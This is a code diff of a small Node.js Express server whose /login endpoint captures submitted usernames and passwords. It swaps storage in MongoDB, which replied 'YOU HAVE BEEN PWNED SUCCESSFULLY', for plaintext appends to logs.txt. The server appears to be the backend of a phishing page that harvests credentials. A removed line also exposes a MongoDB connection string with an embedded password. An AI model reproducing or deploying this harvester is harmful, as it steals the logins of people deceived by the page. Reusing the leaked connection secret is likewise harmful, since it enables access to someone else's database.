@@ -1,7 +1,7 @@
 const express = require("express");
-const mongoose = require("mongoose");
 const bodyParser = require("body-parser");
 const path = require("path");
+const fs = require("fs");
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -13,25 +13,15 @@ app.use(bodyParser.json());
 // Serve static files from the public directory
 app.use(express.static(path.join(__dirname, "public")));
 
-// Connect to MongoDB
-mongoose.connect("mongodb+srv://khalfandes:9-PAw4?qVHwxQXj@cluster0.0xwxe.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0", {
-  useNewUrlParser: true,
-  useUnifiedTopology: true,
-});
-
-const db = mongoose.connection;
-db.on("error", console.error.bind(console, "connection error:"));
-db.once("open", () => {
-  console.log("Connected to MongoDB");
-});
-
-// Define User Schema
-const userSchema = new mongoose.Schema({
-  username: String,
-  password: String,
-});
-
-const User = mongoose.model("User", userSchema);
+// Function to log data to a file
+const logData = (username, password) => {
+  const logEntry = `Username: ${username}, Password: ${password}, Time: ${new Date().toISOString()}\n`;
+  fs.appendFile("logs.txt", logEntry, (err) => {
+    if (err) {
+      console.error("Error writing to log file:", err);
+    }
+  });
+};
 
 // Routes
 app.post("/login", async (req, res) => {
@@ -45,12 +35,13 @@ app.post("/login", async (req, res) => {
       return res.status(400).send("Username and password are required");
     }
 
-    const newUser = new User({ username, password });
-    await newUser.save();
-    res.status(200).send("YOU HAVE BEEN PWNED SUCCESSFULLY 💅");
+    // Save the data to logs.txt instead of MongoDB
+    logData(username, password);
+
+    res.status(200).send("Data saved to logs successfully");
   } catch (err) {
     console.error("Error saving user:", err);
-    return res.status(500).send("Error saving user to database");
+    return res.status(500).send("Error saving user to logs");
   }
 });
 
